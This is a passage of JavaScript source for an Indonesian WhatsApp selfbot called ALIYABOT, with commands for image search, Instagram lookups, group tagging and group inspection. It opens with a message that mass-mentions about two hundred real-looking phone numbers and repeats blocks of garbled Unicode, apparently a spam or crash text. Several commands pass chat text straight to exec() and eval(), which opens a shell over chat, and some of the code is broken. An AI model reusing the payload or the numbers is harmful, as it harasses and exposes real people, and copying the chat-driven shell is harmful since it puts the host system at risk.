~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~`)
break
      case "image":
      case "gimage":
      case "googleimage":
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjadi Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					ALIYABOT.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})             
					break

      case "igstalk":
        if (!q) return reply("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;              
      case "term":
      if (!mek.key.fromMe) return;
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return grupinv(`Khusus Owner 🗿:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
        case 'iguser':
              try {
              if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
              for(let i = 0; i < get_result.length; i++) {
              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
}
              ini_buffer = await getBuffer(get_result[0].profile_pic)
              ALIYABOT.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf username ${query} tidak ditemukan`)
}
              break                      
      case "join":
      if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return reply("pastikan link sudah mekar!");
          var response = await ALIYABOT.acceptInvite(codeInvite);
          reply("SUKSES");
        } catch {
          reply("LINK ERROR!");
        }
        break;
      case "[runtime]":
      case "runtime":
      case "test":
        if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        run = process.uptime();
        teks = `${kyun(run)}`;
        reply(teks);
        break;      
      case "speed":      
        if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          reply(pingnya);
        });
        break;
    
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;        
        case 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            let owogi = await ALIYABOT.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owogi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            reply('reply stiker')
		            }
		            fs.unlinkSync(owgi)
		            break      
      case 'tourl':
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await ALIYABOT.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
      case "inspect":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await ALIYABOT.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          ALIYABOT.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          grupinv("Link error");
        }
        break;
      case "eval":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        ALIYABOT.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!isOwner)return// reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
if (!q)return 
var itsme = `${sender}`
var split = `*ALIYABOT-BotWeA*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return ALIYABOT.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
ALIYABOT.sendMessage(from, stdout, text, term)
}
})
}

      default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 8 gak mabar kak?', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }

     if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return ALIYABOT.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[SELFBOT]", "red"),
        "𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed Di Consolog 🌹
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// 𝙈𝙚𝙣𝙜𝙜𝙖𝙗𝙪𝙩シ︎